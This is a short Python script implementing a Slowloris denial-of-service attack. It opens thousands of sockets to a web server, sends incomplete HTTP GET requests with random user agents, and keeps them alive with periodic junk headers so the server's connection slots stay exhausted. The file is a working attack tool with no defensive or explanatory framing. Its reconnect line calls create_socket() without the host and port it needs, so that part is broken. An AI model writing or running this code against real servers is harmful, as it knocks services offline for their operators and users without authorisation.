import socket
import random
import time

from agents import random_agent

host = "127.0.0.1"
port = 80
timing = 10

def send_line(s, data):
    s.send(bytes(f"{data}\n", 'utf8'))

def send_header(s, header, value):
    send_line(s, f"{header}: {value}")

def create_socket(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))
    
    send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1\n")
    send_header(s, "User-Agent", random_agent())
    return s

def loris(n, host, port, timing):
    # Open sockets
    print("Opening initial sockets:", n)
    sockets = [None] * n
    for i in range(n):
        sockets[i] = create_socket(host, port)

    print("Initial sockets opened.")
    
    # Loop keepalive
    while True:
        for s in sockets:
            try:
                send_header(s, "X-Key", random.randint(0, 65554))
            except:
                sockets.remove(s)

        print(f"Alive: {len(sockets)}/{n}")

        for _ in range(n - len(sockets)):
            sockets.append( create_socket() )

        time.sleep(timing)
        
if __name__ == '__main__':
    loris(10000, host, port, timing)